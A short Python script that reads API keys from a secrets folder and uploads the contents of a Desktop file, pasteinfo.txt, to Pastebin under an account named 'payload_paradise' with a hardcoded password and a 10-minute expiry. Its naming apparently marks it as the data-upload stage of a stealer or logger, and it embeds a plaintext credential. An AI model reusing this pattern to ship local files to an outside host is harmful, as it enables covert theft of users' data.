import requests
import os

try:
    # Read the dev key
    with open(os.path.join("secrets","dev_key"), 'r') as f:
        key = f.read().strip()
except FileNotFoundError:
    print("Dev key not found")
    exit(1)

text = "a text"
t_title = "a_paste_title"

try:
    # Read the user key
    with open(os.path.join("secrets","user_key"), 'r') as f:
        user_key = f.read().strip()
except FileNotFoundError:
    print("User key not found")
    exit(1)

LOG_FILE = os.path.join(os.path.expanduser("~"), "Desktop", "pasteinfo.txt")

# Read the contents of the file
with open(LOG_FILE, 'r') as file:
    file_contents = file.read()

login_data = {
    'api_dev_key': key,
    'api_user_name': 'payload_paradise',
    'api_user_password': 'JDSG874Y834GYDSLHIVNZ',
    'api_option': 'paste',
    'api_paste_code': file_contents,
    'api_paste_name': "testing",
    'api_paste_expire_date': '10M',
    'api_user_key': user_key,
    'api_paste_format': 'gettext'
}

r = requests.post("https://pastebin.com/api/api_post.php", data=login_data)
print("Paste send: ", r.status_code if r.status_code != 200 else "OK/200")
print("Paste URL: ", r.text)




#sent from python 3.7
